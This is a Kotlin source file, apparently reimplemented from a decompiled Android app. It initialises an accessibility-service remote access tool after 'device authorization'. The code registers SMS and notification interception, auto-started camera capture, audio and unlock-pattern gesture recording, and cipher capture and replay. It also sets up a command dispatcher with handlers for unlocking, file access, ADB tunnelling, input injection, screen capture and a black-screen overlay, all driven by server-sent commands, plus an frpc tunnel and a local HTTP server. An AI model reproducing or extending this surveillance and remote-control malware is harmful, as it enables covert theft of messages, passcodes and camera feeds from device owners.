package com.storm.safe.rock.service.delegates.registrar

import com.storm.safe.rock.manager.C0258a0
import com.storm.safe.rock.manager.C0259a1
import com.storm.safe.rock.manager.CameraCaptureManager
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.delegates.BroadcastReceiverRegistry
import com.storm.safe.rock.service.modules.AccessibilityEventRouter
import com.storm.safe.rock.service.modules.FrpcProcessManager
import com.storm.safe.rock.service.modules.GestureRecorderManager
import com.storm.safe.rock.service.modules.NetworkManager
import com.storm.safe.rock.service.modules.NotificationInterceptDelegate
import com.storm.safe.rock.service.modules.RemoteConfigManager
import com.storm.safe.rock.service.modules.SmsInterceptDelegate
import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Post-authorization module registrar — creates managers needed after device authorization.
 *
 * Extracted from ServiceInitializer.initializeDeferredManagers() (JADX: b5, line 2232).
 * Creates: Camera, SMS, Audio, Cipher, EventRouter, CameraCapture,
 *          NotificationIntercept, CommandDispatcher, RemoteConfigManager,
 *          FrpcProcessManager, permission health receiver.
 */
class PostAuthModuleRegistrar : ModuleRegistrar {

    companion object {
        private const val TAG = "PostAuthModuleRegistrar"
    }

    override fun register(service: MyAccessibilityService) {
        android.util.Log.d(TAG, "🔧 [授权后] 开始初始化延迟管理器...")

        // JADX: ensure networkManager
        try {
            val appContext = service.applicationContext
            if (service.networkManager == null) {
                val nm = NetworkManager()
                nm.initialize(appContext)
                service.networkManager = nm
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ NetworkManager 延迟初始化失败", e)
        }

        // JADX: f52371a2 = new C0258a0 — cameraManager
        try {
            service.cameraManager = C0258a0(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CameraManager 延迟初始化失败", e)
        }

        // JADX: f52372a3 = new C0324a9 — smsInterceptDelegate
        try {
            service.smsInterceptDelegate = SmsInterceptDelegate(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ SmsInterceptDelegate 延迟初始化失败", e)
        }

        // ADAPT: C0856mc (MediaContentManager) — not replicated
        // ADAPT: l20 (InjectionManager) — not replicated

        // JADX: f52455i6 = new C0259a1 — audioManager
        try {
            service.audioManager = C0259a1(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ AudioManager 延迟初始化失败", e)
        }

        // ADAPT: C1496yx (SystemInfoCollector) — not replicated

        // JADX: f52437g8 = new C0319a4 — notificationInterceptDelegate
        try {
            service.notificationInterceptDelegate = NotificationInterceptDelegate()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ NotificationInterceptDelegate 延迟初始化失败", e)
        }

        // JADX: f52437g8 (C0319a4) — GestureRecorderManager for pattern capture
        try {
            if (service.gestureRecorderManager == null) {
                service.gestureRecorderManager = GestureRecorderManager(service)
                android.util.Log.d(TAG, "GestureRecorderManager initialized")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "GestureRecorderManager init failed", e)
        }

        // JADX: f52438g9 — cipherCaptureManager singleton
        try {
            if (service.cipherCaptureManager == null) {
                service.cipherCaptureManager = CipherCaptureManager(service, service.applicationContext)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CipherCaptureManager 延迟初始化失败", e)
        }

        // JADX: AccessibilityEventRouter
        try {
            if (service.accessibilityEventRouter == null) {
                service.accessibilityEventRouter = AccessibilityEventRouter(service, service.applicationContext)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ AccessibilityEventRouter 延迟初始化失败", e)
        }

        // JADX: CameraCaptureManager (C0262a4)
        try {
            if (service.cameraCaptureManager == null) {
                service.cameraCaptureManager = CameraCaptureManager(service)
            }
            service.cameraCaptureManager?.startCapture()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CameraCaptureManager 延迟初始化失败", e)
        }

        // JADX: fn0 — permission health monitor
        // f52376a7 = fn0.f56299a2.getInstance(this)

        // JADX: register permission health receiver — delegated to BroadcastReceiverRegistry
        run {
            val registry = service.broadcastReceiverRegistry ?: BroadcastReceiverRegistry(service).also { service.broadcastReceiverRegistry = it }
            registry.registerPermissionHealthReceiver()
            service.permissionHealthReceiverRegistered = registry.isPermissionHealthRegistered
        }

        // JADX: CommandDispatcher initialization
        android.util.Log.d(TAG, "🔧 初始化命令分发器...")
        try {
            val cmdContext = com.storm.safe.rock.service.modules.command.CommandContext(service, service.networkManager)
            service.commandDispatcher = com.storm.safe.rock.service.modules.command.CommandDispatcher(cmdContext)

            // Register all 16 command handlers
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.AppCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.UnlockCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.FileCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.MediaCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.SmsContactsCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.LogCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.DetectionCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.DeviceStateCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.InputCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ScreenCaptureCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ProtectionCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.PermissionCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.GestureCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.CipherReplayCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.BlackScreenCommandHandler())
            android.util.Log.d(TAG, "已注册 16 个命令处理器")

            // Bind commandCallback to dispatch commands via CommandDispatcher
            val dispatcher = service.commandDispatcher!!
            service.networkManager?.commandCallback = { json ->
                service.getCoroutineScope()?.launch(Dispatchers.IO) {
                    try {
                        dispatcher.dispatch(json)
                    } catch (e: Exception) {
                        android.util.Log.e(TAG, "命令分发失败", e)
                    }
                }
            }
            android.util.Log.d(TAG, "✅ commandCallback 已绑定到 CommandDispatcher")

            android.util.Log.d(TAG, "✅ 命令分发器初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CommandDispatcher 延迟初始化失败", e)
        }

        // JADX: RemoteConfigManager (LocalHttpServer) — C0322a7
        try {
            val rcm = RemoteConfigManager(service.applicationContext)
            rcm.commandDispatcher = service.commandDispatcher
            rcm.start()
            service.remoteConfigManager = rcm
            android.util.Log.d(TAG, "✅ RemoteConfigManager 已启动 (port=${RemoteConfigManager.DEFAULT_PORT})")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ RemoteConfigManager 启动失败", e)
        }

        // frpc 进程管理器 — vendor unlockedInstance() CheckProcessThread
        try {
            val fpm = FrpcProcessManager(service.applicationContext)
            fpm.start()
            service.frpcProcessManager = fpm
            android.util.Log.d(TAG, "✅ FrpcProcessManager 已启动")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ FrpcProcessManager 启动失败", e)
        }

        // JADX: request initial config from server
        try {
            service.networkManager?.let { nm ->
                // JADX: nm.sendEvent("request_init_config", JSONObject())
            }
        } catch (_: Exception) {}

        // JADX: register SMS content observer
        try {
            service.registerSmsContentObserver()
        } catch (_: Exception) {}

        android.util.Log.d(TAG, "✅ [授权后] 延迟管理器初始化完成")
    }
}
